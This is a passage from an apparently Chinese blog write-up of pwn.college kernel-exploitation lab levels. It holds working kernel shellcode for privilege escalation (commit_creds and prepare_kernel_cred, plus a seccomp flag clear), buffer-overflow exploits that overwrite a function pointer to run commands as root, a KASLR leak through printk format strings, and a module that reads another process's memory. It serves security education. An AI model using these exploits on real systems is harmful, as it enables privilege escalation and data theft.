<p>在5.4.0的源码中搜索<code>current</code>，找到包含寻址<code>current</code>操作的函数，例如<a href="/kernel/cred.c">&#x2F;kernel&#x2F;cred.c</a>中的<code>revert_creds</code>、<code>override_creds</code>、<code>commmit_creds</code>等函数，在gdb中使用<code>disas</code>命令查看其汇编，即可找到<code>current</code>的真实地址。如下，<code>current</code>的真实地址为<code>gs:0x15d00</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) disas commit_creds<br>Dump of assembler code for function commit_creds:<br>   0xffffffff81088d90 &lt;+0&gt;:     push   %r12<br>   0xffffffff81088d92 &lt;+2&gt;:     mov    %gs:0x15d00,%r12<br></code></pre></td></tr></table></figure>

<ul>
<li>寻找<code>thread_info-&gt;flags</code>在<code>current</code>中的偏移</li>
</ul>
<p><code>p &amp;(((struct task_struct*)0)-&gt;thread_info)</code>查看<code>thread_info</code>成员在<code>task_struct</code>结构体中的偏移，也可以这样查看其它结构体中成员的偏移。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) p &amp;(((struct task_struct*)0)-&gt;thread_info)<br><span class="hljs-meta prompt_">$</span><span class="language-bash">4 = (struct thread_info *) 0x0 &lt;fixed_percpu_data&gt;</span><br>(gdb) p &amp;(((struct thread_info*)0)-&gt;flags)<br><span class="hljs-meta prompt_">$</span><span class="language-bash">6 = (unsigned long *) 0x0 &lt;fixed_percpu_data&gt;</span><br></code></pre></td></tr></table></figure>

<p>或者<code>ptype</code>查看结构体构造。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) ptype struct task_struct<br>type = struct task_struct &#123;<br>    struct thread_info thread_info;<br>    volatile long state;<br>...<br>(gdb) ptype struct thread_info<br>type = struct thread_info &#123;<br>    unsigned long flags;<br>    u32 status;<br>&#125;    <br></code></pre></td></tr></table></figure>

<p>可以发现<code>thread_info-&gt;flags</code>成员就在<code>task_struct</code>结构体的首地址，那么<code>flags</code>成员的地址即<code>gs:0x15d00</code>。</p>
<p>内核态shellcode：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asm">.intel_syntax noprefix<br><br>.section .text<br>.global _start<br>_start:<br>    xor rdi,rdi<br>    mov rcx,0xffffffff810890d0  #prepare_kernel_cred<br>    call rcx<br>    mov rdi,rax<br>    mov rcx,0xffffffff81088d90  #commit_creds<br>    call rcx<br>    <br>    mov    rax,QWORD PTR gs:0x15d00<br>    and    QWORD PTR [rax],0xfffffffffffffeff<br>    xor    eax,eax<br>    <br>    ret<br> <br>#\x48\x31\xff\x48\xc7\xc1\xd0\x90\x08\x81\xff\xd1\x48\x89\xc7\x48\xc7\xc1\x90\x8d\x08\x81\xff\xd1\x65\x48\x8b\x04\x25\x00\x5d\x01\x00\x48\x81\x20\xff\xfe\xff\xff\x31\xc0\xc3<br></code></pre></td></tr></table></figure>

<p>这里手写用户态shellcode较繁琐，并且需要和用户态程序交互，使用<code>pwntools</code>会方便很多。</p>
<p>exp(python)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;/challenge/babykernel_level8.0&#x27;</span>)<br><br>ksc = <span class="hljs-string">b&#x27;\x48\x31\xff\x48\xc7\xc1\xd0\x90\x08\x81\xff\xd1\x48\x89\xc7\x48\xc7\xc1\x90\x8d\x08\x81\xff\xd1\x65\x48\x8b\x04\x25\x00\x5d\x01\x00\x48\x81\x20\xff\xfe\xff\xff\x31\xc0\xc3&#x27;</span><br>shellcode = shellcraft.amd64.write(<span class="hljs-number">3</span>,ksc,<span class="hljs-built_in">len</span>(ksc)) <br>shellcode += shellcraft.amd64.linux.cat(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">1</span>) <span class="hljs-comment">#fd = open(&#x27;/flag&#x27;,0) sendfile(1,fd,length)</span><br>usc = asm(shellcode)<br><br>io.sendline(usc)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="level9-0-amp-level9-1"><a href="#level9-0-amp-level9-1" class="headerlink" title="level9.0 &amp; level9.1"></a>level9.0 &amp; level9.1</h3><p>内核态缓冲区溢出</p>
<p>可以从用户态的buffer向v11传入0x108字节的数据，v11的大小为0x100，多出的8字节可以覆盖函数指针v12。将v12覆盖为<code>run_cmd</code>函数，就可以执行buffer中的命令。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">_BYTE v11[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-120h] BYREF</span><br><span class="hljs-type">void</span> (__fastcall *v12)(_BYTE *); <span class="hljs-comment">// [rsp+100h] [rbp-20h]</span><br>v8 = v11;<br><span class="hljs-keyword">while</span> ( v6 )<br>&#123;<br>  *v8++ = <span class="hljs-number">0</span>;<br>  --v6;<br>&#125;<br>printk(&amp;unk_540, file, buffer, length, offset);<br>v12 = (<span class="hljs-type">void</span> (__fastcall *)(_BYTE *))&amp;printk;<br><span class="hljs-keyword">if</span> ( length &gt; <span class="hljs-number">0x108</span> )<br>&#123;<br>  _warn_printk(<span class="hljs-string">&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;</span>, <span class="hljs-number">264LL</span>, length);<br>  BUG();<br>&#125;<br>v9 = copy_from_user(v11, buffer, length);<br>v12(v11);<br></code></pre></td></tr></table></figure>

<p>寻找run_cmd地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@vm_practice~kernel-security~level9-0:~$ sudo cat /proc/kallsyms | grep run_cmd<br>ffffffff81089580 t run_cmd<br></code></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,fd);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> run_cmd = <span class="hljs-number">0xffffffff81089580</span>;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">0x108</span>] = <span class="hljs-string">&quot;/usr/bin/chmod +777 /flag&quot;</span>;<br>    <span class="hljs-built_in">memset</span>(buffer+<span class="hljs-number">26</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x108</span><span class="hljs-number">-26</span>);<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)&amp;buffer[<span class="hljs-number">0x100</span>] = run_cmd;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> length = <span class="hljs-number">0x108</span>;<br>    write(fd,buffer,length);<br>    close(fd);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>或使用<code>pwntools</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">b&quot;/usr/bin/chmod +777 /flag&quot;</span> + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">231</span> +p64(<span class="hljs-number">0xffffffff81089580</span>))<br></code></pre></td></tr></table></figure>



<h3 id="level10-0-amp-level10-1"><a href="#level10-0-amp-level10-1" class="headerlink" title="level10.0 &amp; level10.1"></a>level10.0 &amp; level10.1</h3><p>描述:Exploit a buggy kernel device with KASLR enabled to get the flag!</p>
<p>内核模块源码和上一题相同，但是开启了<code>kASLR</code>，所以在run_cmd之前需要泄露内核地址计算内核基址的kaslr偏移。</p>
<p>在不溢出的情况下，v12是<code>printk</code>，参数自定义，可通过<code>%px</code>泄露栈上的内核地址（注意<code>%p</code>和<code>%pk</code>都只泄露内核符号的哈希散列值而不是真实地址）。 </p>
<p>分别在未开启kASLR的level9.0和开启kASLR的level10.0运行以下脚本后执行<code>dmesg</code>查看内核日志，发现都存在<code>b6309</code>结尾的内核地址，并且该地址每次运行脚本都不变，可知该地址相对内核加载基址的偏移是固定的，那么相减即可得到<code>kASLR的偏移</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">b&quot; %px\n&quot;</span> *<span class="hljs-number">40</span>)<br><br><span class="hljs-comment">#kaslr_addr: xxxxxxxxxxxb9609</span><br><span class="hljs-comment">#nokaslr_addr :ffffffff810b6309</span><br><span class="hljs-comment">#random_offset = kaslr_addr - nokaslr_addr</span><br></code></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,fd);<br>    <span class="hljs-type">int</span> random_offset = ????????<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> run_cmd = <span class="hljs-number">0xffffffff81089580</span> + random_offset;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">0x108</span>] = <span class="hljs-string">&quot;/usr/bin/chmod +777 /flag&quot;</span>;<br>    <span class="hljs-built_in">memset</span>(buffer+<span class="hljs-number">26</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x108</span><span class="hljs-number">-26</span>);<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)&amp;buffer[<span class="hljs-number">0x100</span> ] = run_cmd;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> length = <span class="hljs-number">0x108</span>;<br>    write(fd,buffer,length);<br>    close(fd);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>或使用<code>pwntools</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>random_offset = ????????<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">b&quot;/usr/bin/chmod +777 /flag&quot;</span> + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">231</span> +p64(<span class="hljs-number">0xffffffff81089580</span> + random_offset))<br></code></pre></td></tr></table></figure>



<h3 id="level11-0-amp-level11-1"><a href="#level11-0-amp-level11-1" class="headerlink" title="level11.0 &amp; level11.1"></a>level11.0 &amp; level11.1</h3><p>未开启<code>kASLR</code>和<code>smap</code></p>
<p>用户态程序流程：</p>
<ul>
<li>在<code>load_flag</code>函数中使用<code>fork</code>创建了子进程。子进程读取flag，向主进程发送信号，然后保持休眠；主进程等待子进程的信号，收到信号继续执行。</li>
<li><code>unlink</code>函数删除&#x2F;flag文件。</li>
<li>开启seccomp沙箱只允许write系统调用。</li>
<li>执行用户态shellcode。</li>
</ul>
<p>用户态存在进程间内存隔离，父进程和子进程不共享虚拟内存空间(除非人为映射共享内存)，因此父进程shellcode无法直接读取子进程bss段的flag。</p>
<p>思路：由于未开启<code>SMAP</code>保护，内核能够读写所有用户态进程内存，我们需要在子进程挂起后于内核态进行如下操作：</p>
<ul>
<li>通过子进程pid(父进程pid+1)获得其<code>task_struct</code>。</li>
<li>通过<code>task_struct</code>获取<code>mm_strcut</code>，该结构体中存储了最高级页表的首地址。</li>
<li>通过<code>mm_strcut</code>获取最高级页表首地址。</li>
<li>通过子进程中的虚拟内存地址和子进程的最高级页表地址递推出内存物理地址。</li>
<li>将内存物理地址通过<code>kmmap</code>映射到内核空间，在内核空间进行读写。</li>
</ul>
<p>具体编程可参考<a target="_blank" rel="noopener" href="http://edsionte.com/techblog/archives/1966">文章1</a>和<a target="_blank" rel="noopener" href="https://blog.csdn.net/vs2008ASPNET/article/details/115294859">文章2</a></p>
<p>装载以下源码编译的内核模块后，会在内核日志输出flag</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vir_to_phy.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/uaccess.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/pid.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/pgtable.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/highmem.h&gt;</span></span><br><br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>); <br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> major_number;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">device_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *filp)</span><br>&#123;<br>    	printk(KERN_ALERT <span class="hljs-string">&quot;Device opened.&quot;</span>);<br>  	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">device_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *filp)</span><br>&#123;<br>    	printk(KERN_ALERT <span class="hljs-string">&quot;Device closed.&quot;</span>);<br>  	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">device_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">char</span> *buffer, <span class="hljs-type">size_t</span> length, <span class="hljs-type">loff_t</span> *offset)</span><br>&#123;<br>	<span class="hljs-type">char</span> *msg = <span class="hljs-string">&quot;Hello pwn.college!\n&quot;</span>;<br>	<span class="hljs-keyword">return</span> copy_to_user(buffer, msg, <span class="hljs-built_in">strlen</span>(msg)) ? -EFAULT : <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">device_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> len, <span class="hljs-type">loff_t</span> *off)</span><br>&#123;<br>  	printk(KERN_ALERT <span class="hljs-string">&quot;Sorry, this operation isn&#x27;t supported.\n&quot;</span>);<br>  	<span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">fops</span> =</span> &#123;<br>  	.read = device_read,<br>  	.write = device_write,<br>  	.open = device_open,<br>  	.release = device_release<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">init_module</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  	major_number = register_chrdev(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;pwn-college-char&quot;</span>, &amp;fops);<br><br>  	<span class="hljs-keyword">if</span> (major_number &lt; <span class="hljs-number">0</span>) &#123;<br>    		printk(KERN_ALERT <span class="hljs-string">&quot;Registering char device failed with %d\n&quot;</span>, major_number);<br>    		<span class="hljs-keyword">return</span> major_number;<br>  	&#125;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> * <span class="hljs-title">kpid</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">task</span>;</span><br>	<span class="hljs-type">char</span> task_name[TASK_COMM_LEN] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>	kpid = find_get_pid(<span class="hljs-number">169</span>);<br>	task = get_pid_task(kpid,PIDTYPE_PID);<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;task_name = %s, task_pid = %d\n&quot;</span>,get_task_comm(task_name,task),task-&gt;pid);<br><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v_address = <span class="hljs-number">0x404040</span>;<br>	<span class="hljs-type">pgd_t</span>* pgde;<br>	<span class="hljs-type">p4d_t</span>* p4de;<br>	<span class="hljs-type">pud_t</span>* pude;<br>	<span class="hljs-type">pmd_t</span>* pmde;<br>	<span class="hljs-type">pte_t</span>* pte;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> task-&gt;mm;<br>	pgde = pgd_offset(mm,v_address); <br><br>	p4de = p4d_offset(pgde,v_address);<br><br>	pude = pud_offset(p4de,v_address); <br><br>	pmde = pmd_offset(pude,v_address);<br><br>	pte = pte_offset_kernel(pmde,v_address);	<br><br>	<span class="hljs-type">unsigned</span> pte_addr = pte_val(*pte);<br>	printk(KERN_INFO <span class="hljs-string">&quot;pte_val = 0x%lx\n&quot;</span>,pte_addr);<br>	<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> page_addr = pte_val(*pte) &amp; PAGE_MASK;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> page_offset = v_address &amp; ~PAGE_MASK;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> phy_addr = page_addr | page_offset;<br>	printk(KERN_INFO <span class="hljs-string">&quot;page_addr = 0x%lx, page_offset = 0x%lx\n&quot;</span>,page_addr,page_offset);<br>	printk(KERN_INFO <span class="hljs-string">&quot;v_address = 0x%lx, phy_addr = 0x%lx\n&quot;</span>,v_address,phy_addr);<br>	<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> PT_addr = pte_page(*pte);<br>	printk(KERN_INFO <span class="hljs-string">&quot;PT_addr = %lx\n&quot;</span>,PT_addr);<br><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vptr=kmap(PT_addr);<br>	printk(KERN_INFO <span class="hljs-string">&quot;vptr = 0x%lx, mapped_vaddress = 0x%lx\n&quot;</span>,vptr,vptr+page_offset);<br><br>	<span class="hljs-type">char</span> *flag = (<span class="hljs-type">char</span> *)(vptr+page_offset);<br>	printk(KERN_INFO <span class="hljs-string">&quot;flag : %s\n&quot;</span>,flag);<br><br>	kunmap(page_addr);<br><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> father_phy_addr = virt_to_phys(v_address);<br>	printk(KERN_INFO <span class="hljs-string">&quot;father_phy_addr = 0x%lx&quot;</span>,father_phy_addr);<br><br>  	printk(KERN_INFO <span class="hljs-string">&quot;I was assigned major number %d.\n&quot;</span>, major_number);<br>  	printk(KERN_INFO <span class="hljs-string">&quot;Create device with: &#x27;mknod /dev/pwn-college-char c %d 0&#x27;.\n&quot;</span>, major_number);<br><br>  	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">cleanup_module</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  	unregister_chrdev(major_number, <span class="hljs-string">&quot;pwn-college-char&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">[ 1712.649027] task_name = babykernel_leve, task_pid = 170<br>[ 1712.654021] pte_val = 0x7c094067<br>[ 1712.654849] page_addr = 0x800000007c094000, page_offset = 0x40<br>[ 1712.656246] v_address = 0x404040, phy_addr = 0x800000007c094040<br>[ 1712.657646] PT_addr = ffffea0001f02500<br>[ 1712.658635] vptr = 0xffff88807c094000, mapped_vaddress = 0xffff88807c094040<br>[ 1712.660336] flag : pwn.college&#123;practice&#125;<br><br>[ 1712.661611] father_phy_addr = 0x778000404040<br></code></pre></td></tr></table></figure>

<p>将模块代码简化后编译，配合<code>objdump</code>反编译查看汇编，方便内核shellcode编写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span 